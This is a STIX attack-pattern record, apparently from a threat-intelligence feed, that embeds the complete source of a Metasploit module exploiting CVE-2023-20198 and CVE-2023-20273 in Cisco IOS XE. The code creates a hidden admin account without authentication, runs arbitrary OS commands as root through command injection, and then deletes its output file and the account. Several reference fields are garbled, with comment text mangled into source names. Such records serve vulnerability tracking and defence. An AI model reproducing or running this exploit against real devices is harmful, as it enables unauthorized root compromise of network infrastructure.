{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--00e0a10e-118c-4087-82b1-d353efaad714",
    "created": "2024-08-14T16:23:17.944589Z",
    "modified": "2024-08-14T16:23:17.944593Z",
    "name": "Cisco IOX XE unauthenticated OS command execution",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/cisco_ios_xe_os_exec_cve_2023_20273.rb",
            "external_id": "cisco_ios_xe_os_exec_cve_2023_20273.rb"
        },
        {
            "source_name": "ThismoduleleveragesCVE-2023-20198tocreateanewadminuser",
            "external_id": "thenauthenticatingasthisuser"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-20198"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-20273"
        },
        {
            "source_name": "reference",
            "url": "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z"
        },
        {
            "source_name": "reference",
            "url": "https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/"
        },
        {
            "source_name": "reference",
            "url": "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z/cvrf/cisco-sa-iosxe-webui-privesc-j22SaA4z_cvrf.xml"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-theory-crafting/"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.leakix.net/2023/10/cisco-root-privesc/"
        },
        {
            "source_name": "#Iftheuserhassuppliedausername/password",
            "external_id": "wecanusethesecredstoleverageCVE-2023-20273andexecuteanOS"
        },
        {
            "source_name": "#command.Ifausername/passwordhavenotbeensupplied",
            "external_id": "wecanleverageCVE-2023-20198tocreateanewadmin"
        },
        {
            "source_name": "#account",
            "external_id": "andthenleverageCVE-2023-20273toexecuteanOScommand.Thisopensuptheabilitytoleveragethe"
        },
        {
            "source_name": "#auxiliarymoduleforCVE-2023-20198tocreateanewadminaccountonce",
            "external_id": "thenusethosenewadmincredsinthis"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HTTP::CiscoIosXe\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Retry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco IOX XE unauthenticated OS command execution',\n        'Description' => %q{\n          This module leverages both CVE-2023-20198 and CVE-2023-20273 against vulnerable instances of Cisco IOS XE\n          devices which have the Web UI exposed. An attacker can execute arbitrary OS commands with root privileges.\n\n          This module leverages CVE-2023-20198 to create a new admin user, then authenticating as this user,\n          CVE-2023-20273 is leveraged for OS command injection. The output of the command is written to a file and read\n          back via the webserver. Finally the output file is deleted and the admin user is removed.\n\n          The vulnerable IOS XE versions are:\n          16.1.1, 16.1.2, 16.1.3, 16.2.1, 16.2.2, 16.3.1, 16.3.2, 16.3.3, 16.3.1a, 16.3.4,\n          16.3.5, 16.3.5b, 16.3.6, 16.3.7, 16.3.8, 16.3.9, 16.3.10, 16.3.11, 16.4.1, 16.4.2,\n          16.4.3, 16.5.1, 16.5.1a, 16.5.1b, 16.5.2, 16.5.3, 16.6.1, 16.6.2, 16.6.3, 16.6.4,\n          16.6.5, 16.6.4s, 16.6.4a, 16.6.5a, 16.6.6, 16.6.5b, 16.6.7, 16.6.7a, 16.6.8, 16.6.9,\n          16.6.10, 16.7.1, 16.7.1a, 16.7.1b, 16.7.2, 16.7.3, 16.7.4, 16.8.1, 16.8.1a, 16.8.1b,\n          16.8.1s, 16.8.1c, 16.8.1d, 16.8.2, 16.8.1e, 16.8.3, 16.9.1, 16.9.2, 16.9.1a, 16.9.1b,\n          16.9.1s, 16.9.1c, 16.9.1d, 16.9.3, 16.9.2a, 16.9.2s, 16.9.3h, 16.9.4, 16.9.3s, 16.9.3a,\n          16.9.4c, 16.9.5, 16.9.5f, 16.9.6, 16.9.7, 16.9.8, 16.9.8a, 16.9.8b, 16.9.8c, 16.10.1,\n          16.10.1a, 16.10.1b, 16.10.1s, 16.10.1c, 16.10.1e, 16.10.1d, 16.10.2, 16.10.1f, 16.10.1g,\n          16.10.3, 16.11.1, 16.11.1a, 16.11.1b, 16.11.2, 16.11.1s, 16.11.1c, 16.12.1, 16.12.1s,\n          16.12.1a, 16.12.1c, 16.12.1w, 16.12.2, 16.12.1y, 16.12.2a, 16.12.3, 16.12.8, 16.12.2s,\n          16.12.1x, 16.12.1t, 16.12.2t, 16.12.4, 16.12.3s, 16.12.1z, 16.12.3a, 16.12.4a, 16.12.5,\n          16.12.6, 16.12.1z1, 16.12.5a, 16.12.5b, 16.12.1z2, 16.12.6a, 16.12.7, 16.12.9, 16.12.10,\n          17.1.1, 17.1.1a, 17.1.1s, 17.1.2, 17.1.1t, 17.1.3, 17.2.1, 17.2.1r, 17.2.1a, 17.2.1v,\n          17.2.2, 17.2.3, 17.3.1, 17.3.2, 17.3.3, 17.3.1a, 17.3.1w, 17.3.2a, 17.3.1x, 17.3.1z,\n          17.3.3a, 17.3.4, 17.3.5, 17.3.4a, 17.3.6, 17.3.4b, 17.3.4c, 17.3.5a, 17.3.5b, 17.3.7,\n          17.3.8, 17.4.1, 17.4.2, 17.4.1a, 17.4.1b, 17.4.1c, 17.4.2a, 17.5.1, 17.5.1a, 17.5.1b,\n          17.5.1c, 17.6.1, 17.6.2, 17.6.1w, 17.6.1a, 17.6.1x, 17.6.3, 17.6.1y, 17.6.1z, 17.6.3a,\n          17.6.4, 17.6.1z1, 17.6.5, 17.6.6, 17.7.1, 17.7.1a, 17.7.1b, 17.7.2, 17.10.1, 17.10.1a,\n          17.10.1b, 17.8.1, 17.8.1a, 17.9.1, 17.9.1w, 17.9.2, 17.9.1a, 17.9.1x, 17.9.1y, 17.9.3,\n          17.9.2a, 17.9.1x1, 17.9.3a, 17.9.4, 17.9.1y1, 17.11.1, 17.11.1a, 17.12.1, 17.12.1a,\n          17.11.99SW\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sfewer-r7', # MSF module\n        ],\n        'References' => [\n          ['CVE', '2023-20198'],\n          ['CVE', '2023-20273'],\n          # Vendor advisories.\n          ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z'],\n          ['URL', 'https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/'],\n          # Vendor list of (205) vulnerable versions.\n          ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z/cvrf/cisco-sa-iosxe-webui-privesc-j22SaA4z_cvrf.xml'],\n          # Technical details on CVE-2023-20198.\n          ['URL', 'https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-theory-crafting/'],\n          ['URL', 'https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/'],\n          # Technical details on CVE-2023-20273.\n          ['URL', 'https://blog.leakix.net/2023/10/cisco-root-privesc/']\n        ],\n        'DisclosureDate' => '2023-10-16',\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('CMD', [ true, 'The OS command to execute.', 'id']),\n        OptString.new('CISCO_ADMIN_USERNAME', [false, 'The username of an admin account. If not set, CVE-2023-20198 is leveraged to create a new admin account.']),\n        OptString.new('CISCO_ADMIN_PASSWORD', [false, 'The password of an admin account. If not set, CVE-2023-20198 is leveraged to create a new admin password.']),\n        OptInt.new('REMOVE_OUTPUT_TIMEOUT', [true, 'The maximum timeout (in seconds) to wait when trying to removing the commands output file.', 30])\n      ]\n    )\n  end\n\n  def run\n    # If the user has supplied a username/password, we can use these creds to leverage CVE-2023-20273 and execute an OS\n    # command. If a username/password have not been supplied, we can leverage CVE-2023-20198 to create a new admin\n    # account, and then leverage CVE-2023-20273 to execute an OS command. This opens up the ability to leverage the\n    # auxiliary module for CVE-2023-20198 to create a new admin account once, then use those new admin creds in this\n    # module to execute multiple OS command without the need to create a new 'temporary' admin account for every\n    # invocation of this module (which will reduce the noise in the devices logs).\n    if !datastore['CISCO_ADMIN_USERNAME'].blank? && !datastore['CISCO_ADMIN_PASSWORD'].blank?\n      exececute_os_command(datastore['CISCO_ADMIN_USERNAME'], datastore['CISCO_ADMIN_PASSWORD'])\n    else\n      admin_username = Rex::Text.rand_text_alpha(8)\n      admin_password = Rex::Text.rand_text_alpha(8)\n\n      unless run_cli_command(\"username #{admin_username} privilege 15 secret #{admin_password}\", Mode::GLOBAL_CONFIGURATION)\n        print_error('Failed to create admin user')\n        return\n      end\n\n      begin\n        vprint_status(\"Created privilege 15 user '#{admin_username}' with password '#{admin_password}'\")\n\n        exececute_os_command(admin_username, admin_password)\n      ensure\n        vprint_status(\"Removing user '#{admin_username}'\")\n\n        unless run_cli_command(\"no username #{admin_username}\", Mode::GLOBAL_CONFIGURATION)\n          print_warning('Failed to remove user')\n        end\n      end\n    end\n  end\n\n  def exececute_os_command(admin_username, admin_password)\n    out_file = Rex::Text.rand_text_alpha(8)\n\n    cmd = \"$(openssl enc -base64 -d <<< #{Base64.strict_encode64(datastore['CMD'])}) &> /var/www/#{out_file}\"\n\n    unless run_os_command(cmd, admin_username, admin_password)\n      print_error('Failed to run command')\n      return\n    end\n\n    begin\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri' => normalize_uri('webui', out_file),\n        'headers' => {\n          'Authorization' => basic_auth(admin_username, admin_password)\n        }\n      )\n\n      unless res&.code == 200\n        print_error('Failed to get command output')\n        return\n      end\n\n      print_line(res.body)\n    ensure\n      vprint_status(\"Removing output file '/var/www/#{out_file}'\")\n\n      # Deleting the output file can take more than one attempt.\n      success = retry_until_truthy(timeout: datastore['REMOVE_OUTPUT_TIMEOUT']) do\n        if run_os_command(\"rm /var/www/#{out_file}\", admin_username, admin_password)\n          next true\n        end\n\n        vprint_status('Failed to delete output file, waiting and trying again...')\n        false\n      end\n\n      unless success\n        print_error(\"Failed to delete output file '/var/www/#{out_file}\")\n        print_error(out_file)\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-10-16"
}